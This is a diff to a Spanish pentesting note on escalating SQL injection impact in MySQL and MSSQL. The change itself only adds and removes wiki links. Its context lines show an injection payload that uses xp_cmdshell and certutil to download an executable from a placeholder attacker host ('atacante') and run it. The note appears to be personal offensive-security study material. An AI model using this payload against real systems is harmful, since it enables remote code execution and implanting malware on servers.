@@ -12,6 +12,7 @@ tags:
 
 > [!info] Referencia pura, no un zettel
 > El impacto es un eje aparte del canal: primero se extrae, después se escala. El criterio de cada vía está en [[SQLi - lectura de archivos en MySQL]] y [[SQLi - stacked queries en MSSQL]]. `yi``  ` copia el payload.
+> El criterio y la decisión, en [[MOC - SQL injection]]. Ver también: [[Dialectos SQL - matriz de referencia]].
 
 ## Lectura de archivos — MySQL
 
@@ -74,7 +75,3 @@ MSSQL: ¿sysadmin? Sin eso, `sp_configure` falla.
 5. '; EXEC xp_cmdshell 'certutil -urlcache -f http://atacante/x.exe %TEMP%\x.exe & %TEMP%\x.exe'-- -
    → descarga y ejecuta el implante
 ```
-
-## Relacionadas
-
-[[SQLi - lectura de archivos en MySQL]] · [[SQLi - stacked queries en MSSQL]] · [[MOC - SQL injection]] · [[Dialectos SQL - matriz de referencia]]
